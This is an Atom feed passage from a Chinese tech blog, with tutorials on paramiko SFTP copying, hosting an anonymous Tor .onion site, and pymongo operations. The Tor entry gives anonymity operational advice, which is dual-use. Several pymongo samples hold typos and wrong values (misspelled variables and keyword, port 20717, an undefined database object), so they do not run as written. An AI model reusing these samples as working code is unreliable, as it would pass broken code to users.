<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cat++</title>
  
  <subtitle>看见我的猫粮吗</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://c.cat.plus/"/>
  <updated>2020-07-21T11:07:10.146Z</updated>
  <id>http://c.cat.plus/</id>
  
  <author>
    <name>Cat</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python复制远程文件及文件目录到本地</title>
    <link href="http://c.cat.plus/2019/01/15/Python/Python%E5%A4%8D%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%88%B0%E6%9C%AC%E5%9C%B0/"/>
    <id>http://c.cat.plus/2019/01/15/Python/Python%E5%A4%8D%E5%88%B6%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%88%B0%E6%9C%AC%E5%9C%B0/</id>
    <published>2019-01-14T16:01:00.000Z</published>
    <updated>2020-07-21T11:07:10.146Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>paramiko是用python写的一个模块，遵循SSH2协议，支持以加密和认证的方式，进行远程服务器的连接。利用该模块，可以方便的进行ssh连接和sftp协议进行sftp文件传输以及远程命令执行,常用于python运维开发；</p><ul><li><p><strong>paramiko 模块内部依赖pycrypto，所以先导入pycrypto</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pycrypto</span><br><span class="line">pip3 install paramiko</span><br></pre></td></tr></table></figure></li></ul></li><li><p>定义一个方法，用于远程复制文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoteScp</span><span class="params">(host_ip, host_port, host_username, host_password, remote_file, local_file)</span>:</span></span><br><span class="line">    scp = paramiko.Transport((host_ip, host_port))</span><br><span class="line">    scp.connect(username=host_username, password=host_password)</span><br><span class="line">    sftp = paramiko.SFTPClient.from_transport(scp)</span><br><span class="line">    sftp.get(remote_file, local_file)</span><br><span class="line">    scp.close()</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">"success"</span>)</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">**注意这里的语句**</span><br><span class="line">`sftp.get(remote_file, local_file)` 中自带的get方法，只能拷贝文件，不能拷贝文件夹。</span><br><span class="line"></span><br><span class="line">* 然后调用这个方法：</span><br><span class="line">```python</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    host_ip = <span class="string">'192.168.1.123'</span></span><br><span class="line">    host_port = <span class="number">22</span></span><br><span class="line">    host_username = <span class="string">'root'</span></span><br><span class="line">    host_password = <span class="string">'password'</span></span><br><span class="line">    remote_path = <span class="string">'/tmp/test.sql'</span></span><br><span class="line">    local_path = <span class="string">'/tmp/test.sql'</span></span><br><span class="line">    RemoteScp(host_ip, host_port, host_username, host_password, remote_path, local_path)</span><br></pre></td></tr></table></figure></li></ul><p>这就是基本远程文件复制的功能实现。这里只能实现文件对文件的远程复制。</p><p>如果我们要远程复制整个文件夹。需要对上面的方法改进一下，加一段循环，让其能遍历远程目录里的所有文件，然后按照上面的方法依次复制到本地。</p><blockquote><p><strong>修改以后的完整代码如下</strong>:</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoteScp</span><span class="params">(host_ip, host_port, host_username, host_password, remote_path, local_path)</span>:</span></span><br><span class="line">    scp = paramiko.Transport((host_ip, host_port))</span><br><span class="line">    scp.connect(username=host_username, password=host_password)</span><br><span class="line">    sftp = paramiko.SFTPClient.from_transport(scp)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        remote_files = sftp.listdir(remote_path)</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> remote_files:   <span class="comment">#遍历读取远程目录里的所有文件</span></span><br><span class="line">            local_file = local_path + file</span><br><span class="line">            remote_file = remote_path + file</span><br><span class="line">            sftp.get(remote_file, local_file)</span><br><span class="line">    <span class="keyword">except</span> IOError:   <span class="comment">#  如果目录不存在则抛出异常</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"remote_path or local_path is not exist"</span>)</span><br><span class="line">    scp.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    host_ip = <span class="string">'192.168.1.123'</span>        <span class="comment"># 远程服务器IP</span></span><br><span class="line">    host_port = <span class="number">22</span>                   <span class="comment"># 远程服务器端口</span></span><br><span class="line">    host_username = <span class="string">'root'</span>           <span class="comment">#远程服务器用户名</span></span><br><span class="line">    host_password = <span class="string">'password'</span>       <span class="comment">#远程服务器密码</span></span><br><span class="line">    remote_path = <span class="string">'/tmp/'</span>            <span class="comment">#这个是远程目录</span></span><br><span class="line">    local_path = <span class="string">'/tmp/'</span>             <span class="comment">#这个是本地目录</span></span><br><span class="line">    RemoteScp(host_ip, host_port, host_username, host_password, remote_path, local_path)  <span class="comment">#调用方法</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;p&gt;paramiko是用python写的一个模块，遵循SSH2协议，支持以加密和认证的方式，进行远程服务器的连接。利用该模块，可以方便的进行ssh连接和sftp协议进行sftp文件传输以及远程命令执行,常用于python运维开发；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;
      
    
    </summary>
    
    
      <category term="Python" scheme="http://c.cat.plus/categories/Python/"/>
    
      <category term="Python运维" scheme="http://c.cat.plus/categories/Python/Python%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="paramiko" scheme="http://c.cat.plus/tags/paramiko/"/>
    
  </entry>
  
  <entry>
    <title>暗网网站搭建和onion域名获取方法</title>
    <link href="http://c.cat.plus/2018/06/12/Darknet/%E6%9A%97%E7%BD%91%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E5%92%8Conion%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7%E6%96%B9%E6%B3%95/"/>
    <id>http://c.cat.plus/2018/06/12/Darknet/%E6%9A%97%E7%BD%91%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E5%92%8Conion%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7%E6%96%B9%E6%B3%95/</id>
    <published>2018-06-12T13:22:53.000Z</published>
    <updated>2020-06-16T09:18:26.626Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="tor项目"><a href="#tor项目" class="headerlink" title="tor项目"></a><strong>tor项目</strong></h3><p>tor项目是美国海军的秘密项目，之后被开源用于真正的匿名网络中。在tor的网络中，你的真实的ip地址和其他和你有关的任何暴露于互联网的信息都会被隐藏，真正保护了用户。tor项目不但为一般用户提供客户端，同时也提供了.onion域名和服务，利用.onion域名可以把你网站的真正地址隐藏起来。</p></blockquote><h4 id="暗网网站搭建准备材料"><a href="#暗网网站搭建准备材料" class="headerlink" title="暗网网站搭建准备材料"></a><strong>暗网网站搭建准备材料</strong></h4><ul><li>服务器或本机内网映射</li><li>网站搭建相关技术</li></ul><p><strong>服务器选择</strong></p><p>如何你想真正隐藏自己，你需要做以下步骤</p><ul><li>建议使用Debian或者Ubuntu的服务器，tor官方文档支持较好</li><li>服务器只用来做tor网站不做其他的任何东西</li><li>匿名支付购买服务器</li><li>不要在服务器上运行 Tor 中继，因为 Tor 中继的ip是暴露的</li><li>不要接受和发送电子邮件</li></ul><p><strong>网站配置</strong></p><ul><li><p>安装nginx或者apache，这里以nginx为例（nginx的使用最为广泛）</p></li><li><p>编辑nginx配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">listen   127.0.0.1:xxxx;#xxxx是你的端口号 不要设置成80为了安全</span><br><span class="line"></span><br><span class="line">…</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sudo service nginx restart#重启服务</span><br></pre></td></tr></table></figure></li><li><p>以Debian服务器搭建暗网网站为例</p></li></ul><h4 id="Tor服务安装"><a href="#Tor服务安装" class="headerlink" title="Tor服务安装"></a><strong>Tor服务安装</strong></h4><ul><li>一般可以通过apt直接安装tor服务 <code>apt install tor</code></li></ul><p>如果不行请进行以下操作</p><ol><li><p>修改source.list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line">最后加下面这两行</span><br><span class="line">deb https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org stretch main</span><br><span class="line">deb-src https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org stretch main</span><br></pre></td></tr></table></figure></li><li><p>添加密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org&#x2F;A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | gpg --import</span><br><span class="line">gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add -</span><br></pre></td></tr></table></figure></li><li><p>安装tor</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">sudo apt-get install tor</span><br></pre></td></tr></table></figure></li><li><p>dns选择</p><p> 默认是deb.torproject.org<br> 备选的有deb-master.torproject.org、mirror.netcologne.de、tor.mirror.youam.de</p></li><li><p>编辑tor配置文件</p><p> vi /etc/tor/torrc<br> 添加<br> HiddenServiceDir /var/lib/tor/hidden_service/<br> HiddenServicePort 80 127.0.0.1:8080</p></li><li><p>启动tor</p><p> <code>sudo service tor start</code><br> 一旦启动，那么你的域名也就生成了</p></li><li><p>查看onion域名</p><p> cat /var/lib/tor/hidden_service/hostname</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;tor项目&quot;&gt;&lt;a href=&quot;#tor项目&quot; class=&quot;headerlink&quot; title=&quot;tor项目&quot;&gt;&lt;/a&gt;&lt;strong&gt;tor项目&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;tor项目是美国海军的秘密项目，之后被开源用于真正的匿名
      
    
    </summary>
    
    
      <category term="Darknet" scheme="http://c.cat.plus/categories/Darknet/"/>
    
    
      <category term="暗网" scheme="http://c.cat.plus/tags/%E6%9A%97%E7%BD%91/"/>
    
      <category term="onion" scheme="http://c.cat.plus/tags/onion/"/>
    
      <category term="tor" scheme="http://c.cat.plus/tags/tor/"/>
    
  </entry>
  
  <entry>
    <title>通过Python操作MongoDB数据库</title>
    <link href="http://c.cat.plus/2018/03/18/MongoDB/%E9%80%9A%E8%BF%87Python%E6%93%8D%E4%BD%9CMongoDB%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>http://c.cat.plus/2018/03/18/MongoDB/%E9%80%9A%E8%BF%87Python%E6%93%8D%E4%BD%9CMongoDB%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <published>2018-03-18T10:21:59.000Z</published>
    <updated>2020-07-23T16:01:42.811Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Python操作MongoDB需要安装pymongo库"><a href="#Python操作MongoDB需要安装pymongo库" class="headerlink" title="Python操作MongoDB需要安装pymongo库"></a><strong>Python操作MongoDB需要安装pymongo库</strong></h4><ul><li><p><strong>安装</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install pymongo</span><br></pre></td></tr></table></figure></li><li><p><strong>操作步骤</strong></p><ol><li>创建mongo数据库的连接对象<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn&#x3D;MongoClient(&#39;localhost&#39;,27017)</span><br></pre></td></tr></table></figure></li><li>生成数据库对象<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db&#x3D;conn.stu</span><br></pre></td></tr></table></figure></li><li>生成集合对象<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_set&#x3D;db.class0</span><br></pre></td></tr></table></figure></li><li>增删改查索引聚合操作<ul><li><strong>插入数据</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_set.insert()</span><br><span class="line">my_set.insert_many()</span><br><span class="line">my_set.insert_one()</span><br><span class="line">my_set.save()</span><br></pre></td></tr></table></figure></li><li><strong>删除数据</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_set.remove(&#123;&#125;,multi &#x3D; True)#multi默认为True 表示删除所有符合条件的数据,设置为False 表示只删除一条</span><br></pre></td></tr></table></figure></li><li><strong>查找数据</strong></li><li><code>find()</code></li><li>功能: 查找数据库内容</li><li>参数: 同mongo shell find()</li><li>返回值: 返回一个游标 –&gt; 迭代器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cursor#可迭代对象属性函数</span><br><span class="line">next()</span><br><span class="line">count()</span><br><span class="line">limit()</span><br><span class="line">skip()</span><br><span class="line">sort()</span><br><span class="line">mongoshell --&gt;sort(&#123;&#39;name&#39;:1&#125;)</span><br><span class="line">pymongo--&gt;sort([(&#39;name&#39;,1)])</span><br></pre></td></tr></table></figure></li><li>进行排序时游标要确保没有被访问过</li><li><code>find_one()</code></li><li>返回值是一个字典</li><li><strong>修改操作</strong></li><li><code>update()</code><ul><li>参数和mongoshell 中 update相同</li><li><code>update_many()</code> : 匹配到多个文档时全部修改</li><li><code>update_one()</code> : 只修改匹配到的第一条文档</li><li>编程中mongo的数据类型null可以用Python中的None替代<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建连接对象</span></span><br><span class="line">conn=MongoClient(<span class="string">'localhost'</span>,<span class="number">27017</span>)</span><br><span class="line"><span class="comment">#创建数据库对象和集合对象</span></span><br><span class="line"><span class="comment">#db=conn.stu</span></span><br><span class="line"><span class="comment">#my_set=db.class3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># __getitem__  __setitem__</span></span><br><span class="line">db=conn[<span class="string">'stu'</span>]</span><br><span class="line">my_set=db[<span class="string">'class3'</span>]</span><br><span class="line"></span><br><span class="line">print(my_set)</span><br><span class="line">print(dir(my_set))</span><br><span class="line"></span><br><span class="line"><span class="comment">#插入数据</span></span><br><span class="line">my_set.insert(&#123;<span class="string">'name'</span>:<span class="string">'HelloKitty'</span>,<span class="string">'age'</span>:<span class="number">3</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除数据</span></span><br><span class="line">my_set.remove(&#123;<span class="string">'name'</span>:<span class="string">'HelloKitty'</span>&#125;,multi = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除所有文档</span></span><br><span class="line"><span class="comment">#my_set.remove()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查找数据</span></span><br><span class="line">sursor=my_set.find(&#123;&#125;,&#123;<span class="string">'_id'</span>:<span class="number">0</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cursor:</span><br><span class="line">print(i[<span class="string">'name'</span>],<span class="string">'----'</span>,i[<span class="string">'age'</span>])</span><br><span class="line"></span><br><span class="line">cls=db.class0</span><br><span class="line">cursor=cls.find(&#123;<span class="string">'gender'</span>:&#123;<span class="string">'$exists'</span>:<span class="literal">True</span>&#125;&#125;,&#123;<span class="string">'_id'</span>:<span class="number">0</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cursor:</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">print(cursor)</span><br><span class="line">print(cursor.next())</span><br><span class="line">print(cursor.count())</span><br><span class="line"><span class="comment">#for i in cursor.skip(2).limit(3):</span></span><br><span class="line"><span class="comment">#print(i)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> curser.sort([(<span class="string">'name'</span>,<span class="number">1</span>)]):</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">dic=&#123;<span class="string">'$or'</span>:[&#123;<span class="string">'name'</span>:&#123;<span class="string">'$gt'</span>:<span class="string">'Tom'</span>&#125;&#125;,&#123;<span class="string">'gender'</span>:<span class="string">'w'</span>&#125;]&#125;</span><br><span class="line">data=cls.find_one(dic)</span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改数据</span></span><br><span class="line">my_set.update(&#123;<span class="string">'name'</span>:<span class="string">'Lily'</span>&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'name'</span>:<span class="string">'amy'</span>&#125;&#125;)</span><br><span class="line">my_set.update(&#123;<span class="string">'name'</span>:<span class="string">'abby'</span>&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'King'</span>:<span class="string">'amy'</span>&#125;&#125;,upsert=<span class="literal">True</span>)</span><br><span class="line">my_set.update(&#123;<span class="string">'King'</span>:<span class="string">'amy'</span>&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'age'</span>:<span class="number">16</span>&#125;&#125;,multi=<span class="literal">True</span>)</span><br><span class="line">my_set.update_many(&#123;<span class="string">'King'</span>:<span class="string">'amy'</span>&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'king_name'</span>:<span class="string">'abby'</span>&#125;&#125;)</span><br><span class="line">my_set.update_one(&#123;<span class="string">'king_name'</span>:<span class="literal">None</span>&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'king_name'</span>:<span class="string">'lisa'</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#查找并删除,查找结果会返回</span></span><br><span class="line">print(my_set.find_one_and_delete(&#123;<span class="string">'name'</span>:<span class="string">'abby'</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭数据库连接</span></span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ol></li></ul><h4 id="索引操作"><a href="#索引操作" class="headerlink" title="索引操作"></a><strong>索引操作</strong></h4><ul><li><p>创建索引</p><ul><li><code>ensure_index()</code></li></ul></li><li><p>查看集合中的索引</p><ul><li><code>list_indexes()</code></li></ul></li><li><p>删除索引</p><ul><li><code>drop_index()</code> 删除某一个索引</li><li><code>drop_indexes()</code> 删除所有索引<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line">conn=MongoClient(<span class="string">'localhost'</span>,<span class="number">27017</span>)</span><br><span class="line">db=conn.stu</span><br><span class="line">my_set=db.class3</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建索引</span></span><br><span class="line">index=my_set.ensure_index(name)</span><br><span class="line"><span class="comment">#返回索引名称</span></span><br><span class="line">print(index)</span><br><span class="line"></span><br><span class="line"><span class="comment">#复合索引</span></span><br><span class="line">index1=my_set.ensure_index([(<span class="string">'name'</span>,<span class="number">1</span>),(<span class="string">'king'</span>,<span class="number">-1</span>)])</span><br><span class="line">print(index1)</span><br><span class="line"></span><br><span class="line">cls=db.class0</span><br><span class="line"><span class="comment">#唯一索引和稀疏索引</span></span><br><span class="line"><span class="comment">#index=cls.ensure_index('name',unique=True)</span></span><br><span class="line"><span class="comment">#print(index)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#index=my_set.ensure_index('king_name',sparse=True)</span></span><br><span class="line"><span class="comment">#print(index)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看一个集合中的索引</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_set.list_indexes():</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除一个索引</span></span><br><span class="line">my_set.drop_index(<span class="string">'name'</span>)</span><br><span class="line">my_set.drop_indexes()</span><br><span class="line"></span><br><span class="line"><span class="comment">#同时创建多个索引</span></span><br><span class="line">index1=IndexModel([(<span class="string">'name'</span>,<span class="number">1</span>),(<span class="string">'king'</span>,<span class="number">-1</span>)])</span><br><span class="line">index2=IndexModel([(<span class="string">'king_name'</span>,<span class="number">1</span>)])</span><br><span class="line">indexes=my_set.create_indexes([index1,index2])</span><br><span class="line"></span><br><span class="line"><span class="comment">## 聚合管道</span></span><br><span class="line"></span><br><span class="line">l=[&#123;<span class="string">'$group'</span>:&#123;<span class="string">'_id'</span>:<span class="string">'$king'</span>,<span class="string">'count'</span>:&#123;<span class="string">'$sum'</span>:<span class="number">1</span>&#125;&#125;&#125;,&#123;<span class="string">'$match'</span>:&#123;<span class="string">'count'</span>:&#123;<span class="string">'$gt'</span>:<span class="number">1</span>&#125;&#125;&#125;]</span><br><span class="line"></span><br><span class="line">cursor=my_set.aggregate(l)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cursor:</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="聚合操作"><a href="#聚合操作" class="headerlink" title="聚合操作"></a><strong>聚合操作</strong></h4><ul><li><code>aggregate([])</code></li><li>参数与mongoshell中聚合参数写法一致</li><li>返回值: 迭代器同find的返回值<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 聚合管道</span></span><br><span class="line"></span><br><span class="line">l=[&#123;<span class="string">'$group'</span>:&#123;<span class="string">'_id'</span>:<span class="string">'$king'</span>,<span class="string">'count'</span>:&#123;<span class="string">'$sum'</span>:<span class="number">1</span>&#125;&#125;&#125;,&#123;<span class="string">'$match'</span>:&#123;<span class="string">'count'</span>:&#123;<span class="string">'$gt'</span>:<span class="number">1</span>&#125;&#125;&#125;]</span><br><span class="line"></span><br><span class="line">cursor=my_set.aggregate(l)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cursor:</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure></li></ul><h4 id="文件存储及提取"><a href="#文件存储及提取" class="headerlink" title="文件存储及提取"></a><strong>文件存储及提取</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用来获取数据库中gridfs的存储文件 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="comment">#和pymongo绑定的</span></span><br><span class="line"><span class="keyword">import</span> gridfs</span><br><span class="line"></span><br><span class="line">conn=MongoClient(<span class="string">'localhost'</span>,<span class="number">20717</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fs=gridfs.GridFS(db)</span><br><span class="line"></span><br><span class="line">files=fs.find()</span><br><span class="line">print(files)</span><br><span class="line">print(files.count())</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">print(file.filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line"><span class="keyword">if</span> file.filename==<span class="string">'abc.mp3'</span>:</span><br><span class="line"><span class="keyword">with</span> open(file.filename,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">whith <span class="literal">True</span>:</span><br><span class="line">data=file.read(<span class="number">64</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">f.write(data)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p><strong>小文件操作</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 